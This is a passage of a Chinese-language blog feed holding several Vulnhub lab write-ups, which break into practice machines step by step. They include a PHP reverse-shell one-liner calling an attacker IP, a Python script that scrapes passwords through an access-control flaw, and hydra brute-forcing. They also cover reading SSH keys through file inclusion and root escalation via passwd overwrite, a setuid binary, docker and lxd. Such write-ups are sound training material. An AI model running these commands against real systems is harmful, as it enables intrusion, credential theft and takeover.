try:​    if isfile(path):​      return True​    else: ​      return False  except Exception: ​    return Falsedef guessit():  num = randint(1, 101)  print(&quot;Choose a number between 1 to 100: &quot;)  try:​    s = input(&quot;Enter your number: &quot;)​    if s == num:​      system(&quot;/bin/sh&quot;)​    else:​      print(&quot;Better Luck next time&quot;)  except:​    print(&quot;Slow claps again&quot;)def readfiles():  user = getuser()  try:​    path = raw_input(&quot;Enter the full of the file to read: &quot;)​    if check(path):​      print(&quot;User %s is not allowed to read %s&quot; % (user, path))​    else:​      print(&quot;Slow clap for this hacker right here&quot;)  except Exception:​    print(&quot;Slow clap for this hacker right here&quot;)def options():  print(&quot;What do you want to do ?&quot;)  print(&quot;1 - Be naughty&quot;)  print(&quot;2 - Guess the number&quot;)  print(&quot;3 - Read some damn files&quot;)  print(&quot;4 - Work&quot;)  try:​    choice = input(&quot;Enter your choice:&quot;)  except Exception:​    print(&quot;\n&quot;)  try:​    choice = int(choice)​    return choice  except Exception:​    print(&quot;Man Stop hacking the damn input menu&quot;)def main(op):  if op == 1:​    naughtyboi()  elif op == 2:​    guessit()  elif op == 3:​    readfiles()  elif op == 4:​    print(&quot;work your ass off!!&quot;)  else:​    print(&quot;Do something better with your life&quot;)if __name__ == &quot;__main__&quot;:  main(options())</code></pre><p>可以再看下 1337端口的服务是怎么运行的</p><p> netstat -tnlp </p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/21.png" alt></p><p>Locate xinetd查询服务</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/22.png" alt></p><p>查看文件</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/23.png" alt></p><p>定位到 /etc/xinetd.d</p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/24.png" alt></p><p>查看game 程序</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/25.png" alt></p><p> 定位到 /opt/1337/run_challenge.sh </p><p><img src="/Vulnhub%E9%9D%B6%E5%9C%BA/10/26.png" alt></p><p>查看最终的程序:</p><pre><code>#!/usr/bin/env python3                                                                                                         import sys                                                                                                 from random import choice, randintfrom pyfiglet import print_figletdef add(a,b): return a+bdef div(a,b): return int(a/b)def multiply(a,b): return a*bdef sub(a,b): return a-bprint_figlet(&quot;Game Time&quot;)print(&quot;Let&#39;s see how good you are with simple maths&quot;)print(&quot;Answer my questions 1000 times and I&#39;ll give you your gift.&quot;)OPERATIONS = [&#39;+&#39;, &#39;-&#39;, &quot;/&quot;, &quot;*&quot;]def main():  for i in range(1001):​    a = randint(1,9)​    b = randint(1,9)​    op = choice(OPERATIONS)  print(a,op,b)​    if op == &quot;+&quot;:​      val = add(a,b)​    if op == &quot;-&quot;:​      val = sub(a,b)​    if op == &quot;/&quot;:​      val = div(a,b)​    if op == &quot;*&quot;:​      val = multiply(a,b)​    try:​      In = int(input(&quot;&gt; &quot;))​    except Exception:​      print(&quot;Stop acting like a hacker for a damn minute!!&quot;)​      sys.exit(1)​    if In == val:​      continue​    else:​      print(&quot;Wrong answer&quot;)​      sys.exit(1)  with open(&quot;/opt/1337/p0rt5&quot;, &#39;r&#39;) as f:​    print(f.read())if __name__ == &quot;__main__&quot;:  main()</code></pre><p> 查看/opt/1337/p0rt5 :</p><p>Here is your gift, I hope you know what to do with it:</p><p>1356, 6784, 3409</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  安装靶机,nmap扫描发现7331端口是http服务,22端口ssh服务被过滤了,21端口允许匿名登陆,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;21/tcp  open ftp   vsftpd 3.0.3

| ftp-anon: Anonymous FTP login al
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Connect-the-dots</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/9/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/9/</id>
    <published>2020-06-30T13:17:40.000Z</published>
    <updated>2020-06-30T13:22:03.199Z</updated>
    
    <content type="html"><![CDATA[<p>   安装靶机,nmap扫描端口及服务:</p><pre><code>PORT   STATE SERVICE VERSION111/tcp  open rpcbind 2-4 (RPC #100000)| rpcinfo: |  program version  port/proto service|  100000 2,3,4    111/tcp  rpcbind|  100000 2,3,4    111/udp  rpcbind|  100000 3,4     111/tcp6 rpcbind|  100000 3,4     111/udp6 rpcbind|  100003 3      2049/udp  nfs|  100003 3      2049/udp6 nfs|  100003 3,4     2049/tcp  nfs|  100003 3,4     2049/tcp6 nfs|  100005 1,2,3   36766/udp  mountd|  100005 1,2,3   44555/tcp6 mountd|  100005 1,2,3   52763/udp6 mountd|  100005 1,2,3   55723/tcp  mountd|  100021 1,3,4   32812/udp6 nlockmgr|  100021 1,3,4   33025/tcp6 nlockmgr|  100021 1,3,4   40763/tcp  nlockmgr|  100021 1,3,4   58422/udp  nlockmgr|  100227 3      2049/tcp  nfs_acl|  100227 3      2049/tcp6 nfs_acl|  100227 3      2049/udp  nfs_acl|_ 100227 3      2049/udp6 nfs_acl2049/tcp open nfs_acl 3 (RPC #100227)7822/tcp open ssh   OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: |  2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)|  256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)|_ 256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)40681/tcp open mountd  1-3 (RPC #100005)40763/tcp open nlockmgr 1-4 (RPC #100021)41697/tcp open mountd  1-3 (RPC #100005)55723/tcp open mountd  1-3 (RPC #100005)</code></pre><p>发现nfs共享服务,使用showmount工具探测此服务:</p><p> <em>showmount -e 192.168.245.11</em>  -&gt; 共享目录/home/morris</p><p> 使用工具mount 挂载共享目录  <em>mount -t nfs 192.168.245.11:/home/morris dir-gongxiang</em></p><p> 更改文件权限时受限: <em>chmod: changing permissions of ‘dir-gongxiang/‘: Read-only file system</em></p><p> 那么查看其它端口的信息</p><p> gobuster扫描目录 </p><p>  首页有两段英文 翻译后:</p><p>  你知道我们一家人是怎么给我们取名字的吧？ 他们给我命名为M，而您命名为N。好吧，除了名字缩写，我们的名字完全一样。 寿命太短，无法在您年老时将姓名保存在您的记忆中，所以为什么不呢！ 但是你知道是谁做的吗？ 我们喜欢詹姆斯·邦德电影的母亲。 她以我的名字命名为M。也许，她认为这部电影的导演太懒了，以至于没有想到   </p><p>我的意思是，谁在乎，对吗？ 哈哈，我知道你也不喜欢我，我这讨厌的笑话。 但是我爱你，兄弟。 因此，在完成操作之前，请不要访问该网站。 除了备份，您什么都找不到，大声笑。</p><p>顺便说一句，我知道你喜欢挑战，所以我也为你准备了一些东西。</p><p>  从这可以得出这个靶机应该有两个用户 morris , norris</p><p>又发现 192.168.245.11/mysite/bootstrap.min.cs 是可以下载的</p><p> 下载打开后发现是jsfuck编码 并且用10个变量分开了 b1,b2,…b10</p><p> 而且有一个注册页面也引用了这个cs</p><p>  这里有一个技巧 在注册页面用控制台将它们合并起来 <em>console.log(b1+b2+b3+b4+b5+b6+b7+b8+b9+b10)</em></p><p> 合并后使用该网址<a href="http://codertab.com/jsunfuck解码得到" target="_blank" rel="noopener">http://codertab.com/jsunfuck解码得到</a>: alert(“You’re smart enough to understand me. Here’s your secret, TryToGuessThisNorris@2k19”)</p><p> 使用hydra工具测试是否可登陆ssh</p><p> <em>hydra -L user -p TryToGuessThisNorris@2k19 ssh://192.168.245.11 -s 7822</em></p><p> 发现norris可登陆 拿到第一个flag: 2c2836a138c0e7f7529aa0764a6414d0</p><p> 发现ftp文件夹中有可疑文件  加上前面扫到21端口</p><p> 用ftp登陆下载可疑文件</p><p> exiftool查看图片详细信息 exiftool game.gif.bak  发现有摩斯电码</p><p> 解码后得到:</p><p>  HEY NORRIS, YOU’VE MADE THIS FAR. FAR FAR FROM HEAVEN WANNA SEE HELL NOW? HAHA YOU SURELY MISSED ME, DIDN’T YOU? OH DAMN MY BATTERY IS ABOUT TO DIE AND I AM UNABLE TO FIND MY CHARGER SO QUICKLY LEAVING A HINT IN HERE BEFORE THIS SYSTEM SHUTS DOWN AUTOMATICALLY. I AM SAVING THE GATEWAY TO MY DUNGEON IN A ‘SECRETFILE’ WHICH IS PUBLICLY ACCESSIBLE.</p><p> 翻译后:</p><p> 嗨，诺里斯，您做了这个。 从天堂湾（WANA WANNA）出发的远方现在看到地狱吗？ 哈哈，你一定想我了，不是吗？ 噢，我的电池即将死，在系统自动关闭之前，我无法快速找到提示，所以无法找到我的充电器。 我正在“可访问的”“秘密文件”中保存通往我的地下城的网关。</p><p> 这里定位关键词 SECRETFILE   find命令查找一下 <em>find / -name SECRETFILE 2&gt;/dev/null</em></p><p> 发现未找到  再用小写试下 <em>find / -name secretfile 2&gt;/dev/null</em>  -&gt;   /var/www/html/secretfile </p><p> cat 下 -&gt; I see you’re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.</p><p>  发现也没什么重要信息,但提示没电了,linux在文本编辑时意外断开的话是会创建备份的</p><p> 查询下隐藏文件 隐藏了 .secretfile.swp  读取时没权限</p><p> 那么将它下载到本机 用strings 工具查看得到可疑字符串 blehguessme090</p><p> 前面了解到这个靶机有两个用户,那么这个用户可能是不是另一个用户morris的密码?</p><p> ssh尝试登陆后成功  没有sudo权限等执行程序可利用</p><p> Tar提权:</p><p> 在norris用户上可以使用tar命令</p><p> 使用命令查看tar权限  <em>/sbin/getcap -r / 2&gt;/dev/null</em>  -&gt;</p><p>  /usr/bin/tar = cap_dac_read_search+ep  发现有读取和搜索文件的权限</p><p> 使用tar将/root目录打包到/tmp中  <em>tar -zcvf /tmp/root.tar.gz /root</em></p><p> 切换到tmp目录中 解压 <em>tar -zvxf root.tar.gz</em></p><p> 拿到第二个flag:8fc9376d961670ca10be270d52eda423</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;   安装靶机,nmap扫描端口及服务:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE VERSION

111/tcp  open rpcbind 2-4 (RPC #100000)

| rpcinfo: 

|  program versio
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Me_and_mygirlfriend</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/8/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/8/</id>
    <published>2020-06-30T13:11:39.000Z</published>
    <updated>2020-06-30T13:16:21.804Z</updated>
    
    <content type="html"><![CDATA[<p>  安装靶机,nmap探测目标ip，端口，服务等</p><p>  进入首页,提示要本地才能访问 . 用 X-Forwarded-For Header插件设定127.0.0.1</p><p>  随便注册一个用户测试发现url参数:index.php?page=dashboard&amp;user_id=13</p><p>  发现 index.php?page=profile&amp;user_id=13 有越权访问 修改user_id便能查看其它用户的密码</p><p> 写一个python脚本将这些用户名和密码都爬取下来:</p><pre><code>    #coding:utf-8    import requests,re    def get_userinfo(id):        header = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&quot;,&quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;}        cookie = {&quot;PHPSESSID&quot;:&quot;cpjq84n46oeupta6g0v0j0r374&quot;}        data = requests.get(url=&quot;http://192.168.245.10/index.php?page=profile&amp;user_id=%s&quot; % id,headers=header,cookies=cookie).text        # &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot; value=&quot;Eweuh Tandingan&quot;&gt;&lt;br&gt;        name = re.search(&#39;&quot;name&quot;\svalue=&quot;(.*?)&quot;&#39;,data).group(1)        username = re.search(&#39;&quot;username&quot;\svalue=&quot;(.*?)&quot;&#39;,data).group(1)        password = re.search(&#39;&quot;password&quot;\svalue=&quot;(.*?)&quot;&#39;,data).group(1)        return name,username,password    for id in range(1,10):        name,username,password = get_userinfo(id)        if name:print(username + &quot;:&quot; + password)</code></pre><p>  将内容保存 userinfo</p><p>  使用hydra测试ssh是否可登陆 <em>hydra -C userinfo ssh://192.168.245.10</em></p><p>  测试发现alice:4lic3 可以登陆ssh </p><p>  拿到第一个flag:gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}</p><p>  提权:</p><p>  <em>sudo -l</em> 查看可执行的程序 </p><p>  (root) NOPASSWD: /usr/bin/php 发现可以执行php</p><p>  php反弹shell即可:</p><p>  <em>sudo php -r ‘$sock=fsockopen(“192.168.245.6”,9001);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</em></p><p>  记得要加上sudo 不然无法得不到root权限</p><p>  拿到第二个flag: gfriEND{56fbeef560930e77ff984b644fde66e7}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  安装靶机,nmap探测目标ip，端口，服务等&lt;/p&gt;
&lt;p&gt;  进入首页,提示要本地才能访问 . 用 X-Forwarded-For Header插件设定127.0.0.1&lt;/p&gt;
&lt;p&gt;  随便注册一个用户测试发现url参数:index.php?page=dashbo
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Gears_of_war</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/7/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/7/</id>
    <published>2020-06-30T13:05:04.000Z</published>
    <updated>2020-06-30T13:10:33.038Z</updated>
    
    <content type="html"><![CDATA[<p>  1.安装靶机 nmap扫描端口及服务 21,22,80,139,445</p><p>   80端口服务没有可利用的点</p><pre><code>139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: LOCUST)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: LOCUST)Service Info: Host: GEARS_OF_WAR</code></pre><pre><code>Host script results:|_clock-skew: mean: -1s, deviation: 0s, median: -1s|_nbstat: NetBIOS name: GEARS_OF_WAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-os-discovery: |  OS: Windows 6.1 (Samba 4.7.6-Ubuntu)|  Computer name: gears_of_war|  NetBIOS computer name: GEARS_OF_WAR\x00|  Domain name: \x00|  FQDN: gears_of_war|_ System time: 2020-02-26T00:55:58+00:00| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2.02: |_  Message signing enabled but not required| smb2-time: |  date: 2020-02-26T00:55:58|_ start_date: N/A</code></pre><p>开启了smb服务</p><p>使用smbmap工具扫描  smbmap -H 192.168.245.9</p><pre><code> fr--r--r--       332 Thu Oct 17 10:53:33 2019  msg_horda.zip​    fr--r--r--       198 Thu Oct 17 14:06:58 2019  SOS.txt​    LOCUS_LAN$                       READ ONLY    LOCUST FATHER​    IPC$                          NO ACCESS    IPC Service (gears_of_war server (Sam</code></pre><p> 发现LOCUS_LAN$是可读的   <em>smbmap -H 192.168.245.9 -R LOCUS_LAN$</em></p><p>  发现也只有这两个文件 msg_horda.zip SOS.txt </p><p>  使用smbclient工具下载这两个文件</p><p>  <em>smbclient //192.168.245.9/LOCUS_LAN$</em>   可以匿名登陆的</p><p>  登陆后使用get命令下载到本地</p><p>  使用enumlinux枚举用户: <em>enum4linux -r 192.168.245.9</em> 保存到user.txt</p><p> 压缩包解压需要密码 SOS.txt 告知需要自己获取密码 提供了提示: @%%,</p><p>  涉及到工具crunch密码字典生成</p><p>  生成字典: <em>crunch 4 4 -t @%%, -o password.txt</em></p><p>  使用fcrack工具破解: <em>fcrackzip -D -v -u -p password.txt msg_horda.zip</em></p><p>  得到密码 r44M</p><p>  解压后得到key.txt  内容: </p><pre><code>&quot;Vamos a atacar a los humanos con toda nuestras hordas,por eso puse en prision a el hombre mas peligroso que tenian,por lo que sin el son debiles.&quot;[[[[[[[[[[[[[[[[[[[[[&quot;3_d4y&quot;]]]]]]]]]]]]]]]]]]]]-General RAAM.</code></pre><p>  使用hydra工具尝试登陆ssh  </p><p>  <em>hydra -L user.txt -p 3_d4y ssh://192.168.245.9  -&gt; marcus</em>可以登陆ssh</p><p>  登陆后执行命令 echo $SHELL -&gt; /bin/rbash cd 等命令是不能执行的</p><p>  返回ssh重新登陆 ssh <a href="mailto:marcus@192.168.245.9">marcus@192.168.245.9</a> -t “bash -noprofile”</p><p>   这样的话执行某些命令就不会受到限制</p><p>  查找特权程序: <em>find /bin -type f -perm -u=s 2&gt;/dev/null</em></p><p>**        </p><pre><code>/bin/cp/bin/mount/bin/ping/bin/fusermount/bin/su/bin/umount</code></pre><p>   利用cp命令将/etc/passwd覆盖达到提权的目的</p><p>  将/etc/passwd 放到 /tmp目录下  cat  /etc/passwd&gt;/tmp/passwd</p><p>   openssl生成用户密码: openssl passwd -1 -salt leng 123456</p><p>   将root用户中的x替换 并添加到passwd中</p><p>  将文件覆盖 :cp passwd /etc/passwd</p><p>   切换用户 su leng 得到root权限</p><p>  拿到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  1.安装靶机 nmap扫描端口及服务 21,22,80,139,445&lt;/p&gt;
&lt;p&gt;   80端口服务没有可利用的点&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: LO
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Os-hacknos3</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/6/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/6/</id>
    <published>2020-06-30T12:57:57.000Z</published>
    <updated>2020-06-30T13:03:29.360Z</updated>
    
    <content type="html"><![CDATA[<p>  安装靶机 nmap探测靶机ip,服务器版本及使用的端口和服务 发现开启 21,22,80端口</p><p>  21端口是ftp服务 尝试登陆失败</p><p>  gobuster扫描目录: </p><p>  <em>gobuster dir -u <a href="http://192.168.245.8" target="_blank" rel="noopener">http://192.168.245.8</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-  medium.txt -o dir-oshacknos3 -t 100</em></p><p>  结果:</p><p>/scripts (Status: 301)</p><p>/devil (Status: 301)</p><p>/websec (Status: 301)</p><p>/server-status (Status: 403)</p><p> devil</p><p> websec页面提示在此页面找突破口</p><p>  这种情况下 扫websec目录: </p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/6/1.png" alt></p><p>被扫描的目录太多,大多访问后页面无变化,这时 使用命令:</p><p> <em>gobuster dir -u [<a href="http://192.168.245.8/websec" target="_blank" rel="noopener">http://192.168.245.8/websec</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt](<a href="http://192.168.245.8/websec" target="_blank" rel="noopener">http://192.168.245.8/websec</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt) –wildcard -t 80 -l | grep -v 4644,4366,4346</em>  可以减少无效的结果</p><p> 发现敏感目录admin 访问后是后台</p><p> 于是使用工具 cewl 生成密码字典爆破</p><p> <em>cewl <a href="http://192.168.245.8/websec" target="_blank" rel="noopener">http://192.168.245.8/websec</a> &gt; cewl.txt</em></p><p> 后台页面审查元素:</p><p> <img src="/Vulnhub%E9%9D%B6%E5%9C%BA/6/2.png" alt></p><p> 邮箱尝试用websec首页的邮箱 <a href="mailto:contact@hacknos.com">contact@hacknos.com</a> </p><p> 使用工具hydra爆破:</p><p> <em>hydra -l <a href="mailto:contact@hacknos.com">contact@hacknos.com</a> user -P cewl.txt 192.168.245.8 http-post-form “/websec/admin:username=^USER^&amp;password=^PASS^:Wrong email”</em></p><p> 爆破出密码:Securityx 并登陆后台</p><p> 在Themes主题中可以上传文件,上传一句话但不能访问,发现.htaccess文件内容限制了.php文件的访问,将内容删除即可.</p><p> 然后还是常规反弹shell的操作…</p><p> 反弹shell后复制一些敏感信息 upload.php config.php </p><p> cat /etc/passwd 发现blackdevil用户 拿到user.txt </p><p> 第一个flag:bae11ce4f67af91fa58576c1da2aad4b</p><p> 下一步提权:</p><p>  查找特权程序:  <em>find / -type f -perm -u=s 2&gt;/dev/null</em></p><p>**  </p><p>  cpulimit这个程序貌似可以利用 </p><p>  <em>cpulimit -l 50 -f /bin/bash</em>  执行后发现权限是没有变化的</p><p> 但是可以执行二进制文件的</p><p> 写一个c语言程序进行提权:</p><pre><code>#include &lt;stdio.h&gt;\#include &lt;stdlib.h&gt;\#include &lt;unistd.h&gt;int main(int argc,char *argv[]){​    setreuid(0,0);​    execve(&quot;/bin/bash&quot;,NULL,NULL);}</code></pre><p> 编译: <em>gcc c.c -o cexp</em></p><p> 用wget下载过去或base64编码复制过去都行的</p><p> 执行命令提权: <em>cpulimit -l 100 -f ./cexp</em>  </p><p>  拿到第二个flag: bae11ce4f67af91fa58576c1da2aad4b</p><p>第二种提权方式:</p><p> su 切换到blackdevil用户</p><p> id 查看用户组在docker中</p><p> 下载docker镜像提权: <em>docker run -v /:/mnt –rm -it alpine chroot /mnt sh</em>  将靶机目录挂载到镜像中 因为镜像中的用户是root 用户 也就意味着提权</p><p> 但是有些命令是不能执行的 将靶机根目录挂载到镜像中就行了</p><p> <em>docker run -it 容器id -v /:/mbt</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  安装靶机 nmap探测靶机ip,服务器版本及使用的端口和服务 发现开启 21,22,80端口&lt;/p&gt;
&lt;p&gt;  21端口是ftp服务 尝试登陆失败&lt;/p&gt;
&lt;p&gt;  gobuster扫描目录: &lt;/p&gt;
&lt;p&gt;  &lt;em&gt;gobuster dir -u &lt;a href=
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Cynix</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/5/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/5/</id>
    <published>2020-06-30T12:47:23.000Z</published>
    <updated>2020-06-30T12:57:40.644Z</updated>
    
    <content type="html"><![CDATA[<p> 知识点:nmap使用,ip地址转换, 文件读取,ssh密钥登陆lxd提权  </p><p>1.安装靶机  使用命令进行全端口扫描:</p><p>  <em>nmap -p- -T5 192.168.245.7  -&gt; 80,6688</em></p><p>  对端口服务探测</p><p>  <em>nmap -p 80,6688 -sV 192.168.245.7 -oA cynix-port</em> </p><p>  发现ssh服务</p><p>  gobuster扫描目录 -&gt; /lavalamp </p><p>  对lavalamp 目录扫描 访问文件夹403</p><p>  首页有表单 用</p><pre><code>&lt;p&gt;test&lt;/p&gt;</code></pre><p>测试表单</p><p>  提交后 得到canyoupassme.php文件</p><p>  访问文件,检查元素:</p><pre><code>&lt;div&gt;Specify a number: &lt;input type=&quot;text&quot; name=&quot;file&quot; placeholder=&quot;integer&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;input    type=&quot;submit&quot; name=&quot;read&quot; value=&quot;Download the number&quot;&gt;&lt;/div&gt;</code></pre><p> 看到file参数想到文件读取,添加value参数,抓包</p><p> 经过测试,就是要让我们绕过localhost，这里利用ip转换知识:</p><p> <a href="https://rixx.de/blog/fun-legacy-ip-addresses/" target="_blank" rel="noopener">https://rixx.de/blog/fun-legacy-ip-addresses/</a>  </p><p> 127.0.0.1-&gt; 2130706433</p><p> 修改file=file=2130706433/../../etc/passwd  成功访问文件</p><p> 发现只有ford和root用户可以登陆</p><p> ford用户目录在/home/ford中 </p><p> 之前通过nmap扫到6688是ssh服务,尝试获取用户的ssh密钥登陆服务器</p><p> 修改file=file=2130706433/../../home/ford/.ssh/id_rsa 获得私钥 并保存在本地</p><p> 更改权限 chmod 600 id_rsa</p><p> 尝试用私钥登陆ssh成功</p><p> cat user.txt 拿到第一个flag:02d6267ed96e6b615b031dafe9607151</p><p>  id 查看用户权限:</p><p>  uid=1000(ford) gid=1000(ford) groups=1000(ford),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),113(lxd)</p><p> 发现lxd(与docker类似) 利用lxd拿到第二个flag:</p><p>  第一种方式:</p><p>  创建容器:<em>lxc init ubuntu:16.06 aleng -c security.privileged=true</em>  然后进入容器</p><p> 第二种方式:</p><p>  <em>git clone <a href="https://github.com/saghul/lxd-alpine-builder" target="_blank" rel="noopener">https://github.com/saghul/lxd-alpine-builder</a></em>  下载镜像工具</p><p>  <em>sudo ./build-alpine</em>  下载镜像</p><p>  <em>lxc image import ./alpine-v3.11-x86_64-20200224_2341.tar.gz –alias aleng</em>  导入镜像</p><p>  <em>lxc init aleng aleng -c security.privileged=true</em> 创建容器</p><p>  <em>lxc config device add aleng aleng disk source=/ path=/mnt/root recursive=true</em>  将靶机硬盘(/ 即根目录)挂载到容器目录/mnt/root中,如果访问/mnt/root这个目录的话就相当于访问了靶机的硬盘 (根目录)</p><p>  <em>lxc start aleng</em>  进入容器</p><p>  <em>lxc exec aleng /bin/sh</em>  进入容器执行/bin/sh程序</p><p>  id 查看是root权限,ifconfig 查看后是容器的root用户,说明是可以提权的</p><p>  <em>ls -al /mnt/root/root/</em>  得到root.txt</p><p>  <em>cat /mnt/root/root/root.txt</em></p><p>  拿到第二个flag:b0f971eddce7bd007e9f50ca02f5fe11</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 知识点:nmap使用,ip地址转换, 文件读取,ssh密钥登陆lxd提权  &lt;/p&gt;
&lt;p&gt;1.安装靶机  使用命令进行全端口扫描:&lt;/p&gt;
&lt;p&gt;  &lt;em&gt;nmap -p- -T5 192.168.245.7  -&amp;gt; 80,6688&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;  
      
    
    </summary>
    
    
      <category term="Vulnhub靶场" scheme="http://perthinking.xyz/categories/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub靶场做题记录-Os-Bytesec</title>
    <link href="http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/4/"/>
    <id>http://perthinking.xyz/Vulnhub%E9%9D%B6%E5%9C%BA/4/</id>
    <published>2020-06-30T12:35:37.000Z</published>
    <updated>2020-06-30T12:45:53.890Z</updated>
    
    <content type="html"><![CDATA[<p>  1.安装靶机</p><p>  2.gobuster扫目录 并没有关键信息</p><p>   nmap 扫端口服务及版本探测  开启敏感端口及服务</p><p><em>139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</em></p><p><em>445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</em>  </p><p>​     </p><p>   使用nmap漏洞利用脚本探测:</p><p>   <em>nmap -p 139,445 –script=smb-vuln-</em>.nse –script-args=unsafe=1 192.168.245.3*</p><p>   返回结果:</p><p><em>Host script results:</em></p><p><em>|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)</em></p><p><em>|_smb-vuln-ms10-061: false</em></p><p><em>| smb-vuln-regsvc-dos:</em> </p><p><em>|  VULNERABLE:</em></p><p><em>|  Service regsvc in Microsoft Windows systems vulnerable to denial of service</em></p><p><em>|   State: VULNERABLE</em></p><p><em>|    The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</em></p><p><em>|    pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</em></p><p><em>|    while working on smb-enum-sessions.</em></p><p><em>|_</em>     </p><p>   说明漏洞利用失败</p><p>  利用smbmap工具进一步信息搜集: <em>smbmap -H 192.168.245.3</em></p><p><em>[+] Finding open SMB ports….</em></p><p><em>[+] Guest SMB session established on 192.168.245.3…</em></p><p><em>[+] IP: 192.168.245.3:445    Name: unknown</em>                      </p><p>​    <em>Disk                          Permissions   Comment</em></p><p>​    <em>—-                          ———–   ——-</em></p><p>​    <em>print$                         NO ACCESS    Printer Drivers</em></p><p>​    <em>IPC$                          NO ACCESS    IPC Service (nitin server (Samba, Ubuntu))</em></p><p>** </p><p>发现没有权限访问 ,可以匿名登陆</p><p>   <em>smbmap -H 192.168.245.3 -u admin</em> 加上用户名访问后还是一样的结果</p><p>   从着推断出 如果用户密码不对的话会用Guest用户进行访问,所以没有权限访问</p><p>   使用enum4linux工具获取共享列表,目录  -S</p><p>​    <em>Sharename    Type   Comment</em></p><p>​    <em>———    —-   ——-</em></p><p>​    <em>print$     Disk   Printer Drivers</em></p><p>​    <em>IPC$      IPC    IPC Service (nitin server (Samba, Ubuntu))</em></p><p>​    等</p><p>   不加参数扫描表示全方位的扫描 获取到用户名</p><p><em>[+] Enumerating users using SID S-1-22-1 and logon username ‘’, password ‘’</em></p><p><em>S-1-22-1-1000 Unix User\sagar (Local User)</em></p><p><em>S-1-22-1-1001 Unix User\blackjax (Local User)</em></p><p><em>S-1-22-1-1002 Unix User\smb (Local User)</em></p><p>   接着使用这三个用户尝试登陆</p><p>   <em>smbmap -H 192.168.245.3 -u smb</em></p><p>   发现比之前两个登陆的用户多了数据</p><p>   于是使用smbclient 获取文件</p><p>   <em>smbclient -L 